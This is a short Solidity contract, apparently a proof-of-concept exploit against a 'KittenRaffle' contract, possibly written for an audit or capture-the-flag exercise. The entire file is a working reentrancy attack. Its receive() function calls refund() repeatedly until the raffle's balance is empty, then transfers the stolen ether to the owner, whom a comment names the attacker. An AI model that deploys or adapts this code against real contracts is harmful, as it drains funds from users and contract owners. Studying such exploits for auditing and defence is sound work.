// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "./KittenRaffle.sol";

contract KittenHack {
    KittenRaffle raffle;
    address payable raffleAddress;
    address owner;
    uint playerIndex; 

    constructor(address payable _raffleAddress){
        raffleAddress = _raffleAddress;
        raffle = KittenRaffle(_raffleAddress);
        owner = msg.sender;
    }

    receive() external payable{
        if(address(raffle).balance > 0){
            raffle.refund(playerIndex);
        }else{
            // Get money out of contract to attacker's address
            payable(owner).transfer(address(this).balance);
        }
    }

    function prepareAttack() external payable{
         (bool success, bytes memory data) = raffleAddress.call{value: msg.value}("");
    }

    function attack(uint _playerIndex) external payable{
        playerIndex = _playerIndex;
        raffle.refund(playerIndex);
    }
}